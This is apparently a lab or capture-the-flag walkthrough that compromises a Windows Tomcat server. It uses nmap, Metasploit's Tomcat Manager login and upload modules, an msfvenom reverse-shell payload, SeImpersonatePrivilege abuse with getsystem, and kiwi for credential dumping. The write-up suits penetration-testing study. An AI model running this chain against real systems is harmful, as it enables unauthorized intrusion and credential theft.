We are going to start with the Reconnaissance by scanning the target IP by running nmap however it looks the device is down however nmap is trying to validate if the device is up and running, as we know it is running we can skip "Host Discovery" by using -Pn.

```nmap
sudo nmap -T5 -v -n -Pn <IP>
```

![Image Description](Uploads/Initial%20Scan.png)

![Image Description](Uploads/Second%20Scan.png)

Once we have identified the open ports, we can perform an scan over those ports trying to find more information like versions and potential vulnerabilities.

```nmap
sudo nmap -sC -sV  -p3389,8009,9090 -Pn <IP>
```

![Image Description](Uploads/targeted.png)

Following the instructions "*Discover valid credentials to access the Manager area of the Apache Tomcat server*", with this information we can use Metasploit to search for anyting related to the versions we found, I search for Apache Tomcat Manager and only for Auxiliary module.

![Image Description](Uploads/search.png)

We found an interesting module for Tomcat Application Manager Login Utility. "*This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass.*", once we configure all the fields, we found a username and password.

![Image Description](Uploads/userpass.png)

Now we have credentials, we need to search for a proper module to exploit it and obtain access to the server, I used similar search but changing the "type" to "exploit" and I found an interesting one to Upload Code Execution, I set all the fields and execute the module. After some seconds we got initial access and we can visualize the first flag.

![Image Description](Uploads/exploit.png)

![Image Description](Uploads/payload.png)

![Image Description](Uploads/flag.png)

I put the meterpreter session in the background on session 1, I tried to use local_exploit_suggester module however the payload I found did not work to escalate my privilege so I decided to enumerate the system manually.

![Image Description](Uploads/background.png)

![Image Description](Uploads/suggester.png)

User is not part of the "Administrators" group however there is a really interesting privilege assigned to the user, **SeImpersonatePrivilege** is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account, we can abuse of this privilege to impersonate SYSTEM user.

![Image Description](Uploads/enum.png)

![Image Description](Uploads/impersonate.png)

In order to properly abuse to this privilege, I need to be able to obtain a meterpreter session with **windows/meterpreter/reverse_tcp** to execute **getsystem**. So, I decided to create a custom payload with msfvenom (this should have a different IP from our initial shell):

```msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<> LPORT=<> -f exe -o shell.exe
```

![Image Description](Uploads/msfvenom.png)

I created a folder to upload **shell.exe** file, once uploaded, I opened a new Meterpreter terminal and I used **multi/handler**. I configured same IP and PORT from msfvenom and click run to start the listener. In my other sessions, I executed .\shell.exe

![Image Description](Uploads/upload_shell.png)

![Image Description](Uploads/meterpreter_shell.png)

Finally with a more powershell reverse shell, I can list available commands and use **getsystem**, "*getsystem command is used to attempt privilege escalation by elevating the current user session to the SYSTEM account or Administrator level, depending on what is available and possible on the target system.*"

Finally we can use **load** command to use **kiwi**.

![Image Description](Uploads/SYSTEM.png)

![Image Description](Uploads/kiwi.png)
